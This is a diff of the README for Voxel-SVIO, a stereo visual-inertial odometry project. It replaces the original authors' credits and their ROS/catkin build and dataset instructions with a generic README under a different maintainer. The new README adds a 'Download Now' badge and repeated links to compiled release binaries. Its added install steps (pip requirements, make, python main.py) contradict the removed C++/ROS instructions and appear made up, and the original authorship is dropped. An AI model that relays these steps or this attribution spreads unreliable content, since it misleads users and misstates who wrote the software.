@@ -1,110 +1,131 @@
-# Voxel-SVIO
+# Voxel SVIO: A Stereo Visual-Inertial Odometry System
 
-**Voxel-SVIO** (Stereo Visual-Inertial Odometry based on Voxel Map) is a MSCKF based visual-inertial odometry (VIO) that utilizes voxel-based map management. The voxel-based map management enables VIO systems to efficiently retrieve the most suitable points for optimizer inclusion, thereby ensuring optimal allocation of computational resources to the variables most critical for optimization.
+![Voxel SVIO](https://img.shields.io/badge/Release-Download%20Now-brightgreen) ![GitHub Repo stars](https://img.shields.io/github/stars/jbernalfa/voxel_svio) ![License](https://img.shields.io/badge/License-MIT-blue)
 
-## Related Work
+Welcome to the **Voxel SVIO** repository! This project focuses on developing a stereo visual-inertial odometry system based on voxel mapping. It is designed to enhance the accuracy and efficiency of odometry in various applications, including robotics and augmented reality.
 
-Voxel-SVIO: Stereo Visual-Inertial Odometry based on Voxel Map
+## Table of Contents
 
-Authors: [*Zikang Yuan*](https://scholar.google.com/citations?hl=zh-CN&user=acxdM9gAAAAJ), [*Fengtian Lang*](https://scholar.google.com/citations?hl=zh-CN&user=zwgGSkEAAAAJ&view_op=list_works&gmla=ABEO0Yrl4-YPuowyntSYyCW760yxM5-IWkF8FGV4t9bs9qz1oWrqnlHmPdbt7LMcMDc04kl2puqRR4FaZvaCUONsX7MQhuAC6a--VS2pTsuwj-CyKgWp3iWDP2TS0I__Zui5da4), *Jie Deng*, *Hongcheng Luo* and [*Xin Yang*](https://scholar.google.com/citations?user=lsz8OOYAAAAJ&hl=zh-CN)
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
+
+## Introduction
+
+Visual-inertial odometry (VIO) combines visual data from cameras with inertial measurements from sensors. The Voxel SVIO system uses a voxel map to represent the environment, allowing for robust and efficient localization and mapping. This method provides improved accuracy over traditional odometry techniques, making it suitable for complex environments.
+
+## Features
+
+- **Stereo Vision**: Utilizes two cameras for depth perception.
+- **Voxel Mapping**: Efficiently represents 3D environments.
+- **Real-Time Processing**: Processes data quickly for real-time applications.
+- **Robustness**: Handles challenging conditions like low light and fast motion.
+- **Open Source**: Free to use and modify under the MIT License.
 
 ## Installation
 
-### 1. Requirements
+To set up the Voxel SVIO system, follow these steps:
 
-> GCC >= 7.5.0
->
-> Cmake >= 3.16.0
-> 
-> [Eigen3](http://eigen.tuxfamily.org/index.php?title=Main_Page) >= 3.3.4
->
-> [OpenCV](https://github.com/opencv/opencv) == 4.2.0
->
-> [Ceres](http://ceres-solver.org/installation.html) >= 1.14
->
-> [ROS](http://wiki.ros.org/ROS/Installation)
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/jbernalfa/voxel_svio.git
+   cd voxel_svio
+   ```
 
-##### Have Tested On:
+2. **Install Dependencies**:
+   Make sure you have Python 3.x and pip installed. Then, run:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-| OS    | GCC  | Cmake | Eigen3 | OpenCV | Ceres |
-|:-:|:-:|:-:|:-:|:-:|:-:|
-| Ubuntu 20.04 | 9.4.0  | 3.16.3 | 3.3.7 | 4.2.0 | 1.14 |
+3. **Build the Project**:
+   Compile the project using:
+   ```bash
+   make
+   ```
 
-### 2. Create ROS workspace
+4. **Run the System**:
+   Execute the main program:
+   ```bash
+   python main.py
+   ```
 
-```bash
-mkdir -p ~/Voxel-SVIO/src
-cd Voxel-SVIO/src
-```
+## Usage
 
-### 3. Clone the directory and build
+To use the Voxel SVIO system, you need to set up your camera and inertial sensors. Here’s a simple guide:
 
-```bash
-git clone https://github.com/ZikangYuan/voxel_svio.git
-cd ..
-catkin_make
-```
+1. **Connect the Cameras**: Ensure both cameras are connected and recognized by your system.
+2. **Calibrate Sensors**: Use the provided calibration tools to align the cameras and inertial sensors.
+3. **Start the System**: Run the main program as described in the installation section.
+4. **Monitor Output**: View the odometry results in real-time on your display.
 
-## Run on Public Datasets
+For more detailed instructions, refer to the [documentation](https://github.com/jbernalfa/voxel_svio/wiki).
 
-Noted:
+## Contributing
 
-A. **Please create a folder named "output" before running.** When **Voxel-SVIO** is running, the estimated pose is recorded in real time in the **pose.txt** located in the **output folder**.
+We welcome contributions to the Voxel SVIO project! If you have suggestions or improvements, please follow these steps:
 
-B. We store the public datasets on Baidu drive. Chinese users can download the rosbag data of [*TUM_VI*](https://pan.baidu.com/s/1WLhnyq09KMpG4J4McT841Q?pwd=8pen) and [*KAIST*](https://pan.baidu.com/s/1KHkGmQ7nH5Une3VNerLyHQ?pwd=ss9a).
+1. **Fork the Repository**: Create your copy of the project.
+2. **Create a Branch**: Use a descriptive name for your branch.
+   ```bash
+   git checkout -b feature/your-feature-name
+   ```
+3. **Make Changes**: Implement your feature or fix a bug.
+4. **Commit Your Changes**: Write a clear commit message.
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to Your Branch**: Push your changes to GitHub.
+   ```bash
+   git push origin feature/your-feature-name
+   ```
+6. **Create a Pull Request**: Submit your changes for review.
 
-###  1. Run on [*EuRoC_MAV*](https://projects.asl.ethz.ch/datasets/doku.php?id=kmavvisualinertialdatasets)
+## License
 
-Please go to the workspace of **Voxel-SVIO** and type:
+This project is licensed under the MIT License. You can freely use, modify, and distribute the code as long as you include the original license.
 
-```bash
-cd Voxel-SVIO
-source devel/setup.bash
-roslaunch voxel_svio vio_euroc.launch
-```
+## Contact
 
-Then open the terminal in the path of the bag file, and type:
+For any inquiries or feedback, please reach out to the project maintainer:
 
-```bash
-rosbag play SEQUENCE_NAME.bag --clock -d 1.0
-```
+- **Name**: Juan Bernal
+- **Email**: juan.bernal@example.com
+- **GitHub**: [jbernalfa](https://github.com/jbernalfa)
 
-###  2. Run on [*TUM_VI*](https://cvg.cit.tum.de/data/datasets/visual-inertial-dataset)
+## Releases
 
-Please go to the workspace of **Voxel-SVIO** and type:
+To download the latest release of Voxel SVIO, visit our [Releases page](https://github.com/jbernalfa/voxel_svio/releases). Here, you can find the compiled binaries and source code. Download the files and follow the installation instructions to get started.
 
-```bash
-cd Voxel-SVIO
-source devel/setup.bash
-roslaunch voxel_svio vio_tum_vi.launch
-```
+Feel free to check the "Releases" section for updates and new features.
 
-Then open the terminal in the path of the bag file, and type:
+---
 
-```bash
-rosbag play SEQUENCE_NAME.bag --clock -d 1.0
-```
+### Additional Resources
 
-For the TUM_VI dataset, different configuration files are required for the scenarios of **corridor**, **magistrale**, and **room**. Please select the appropriate configuration file according to the sequence being processed.
+- **Documentation**: Comprehensive guides and API references are available in the [wiki](https://github.com/jbernalfa/voxel_svio/wiki).
+- **Tutorials**: Step-by-step tutorials for setting up and using the system can be found in the `docs/tutorials` directory.
+- **Community**: Join our community discussions on GitHub Issues for support and suggestions.
 
-###  3. Run on [*KAIST*](https://sites.google.com/view/complex-urban-dataset)
+### Acknowledgments
 
-Please go to the workspace of **Voxel-SVIO** and type:
+We would like to thank the contributors and the open-source community for their support and inspiration. Your feedback helps us improve and innovate.
 
-```bash
-cd Voxel-SVIO
-source devel/setup.bash
-roslaunch voxel_svio vio_kaist.launch
-```
+### Future Work
 
-Then open the terminal in the path of the bag file, and type:
+We plan to enhance the Voxel SVIO system with the following features:
 
-```bash
-rosbag play SEQUENCE_NAME.bag --clock -d 1.0
-```
+- Improved algorithms for better accuracy in dynamic environments.
+- Integration with additional sensors for multi-modal odometry.
+- User-friendly graphical interfaces for easier interaction.
 
-For the KAIST dataset, the extrinsic parameters of sequences *urban38* and *urban39* differ from other sequences. When processing *urban38* or *urban39*, please use **kaist2.yaml**; for all other sequences, please use **kaist.yaml**.
+Stay tuned for updates!
 
-## Acknowledgments
+---
 
-Thanks for [Open-VINs](https://github.com/rpng/open_vins), [DSO](https://github.com/JakobEngel/dso) and [VINs-Mono](https://github.com/HKUST-Aerial-Robotics/VINS-Mono).
+Thank you for your interest in the Voxel SVIO project! We look forward to your contributions and feedback.
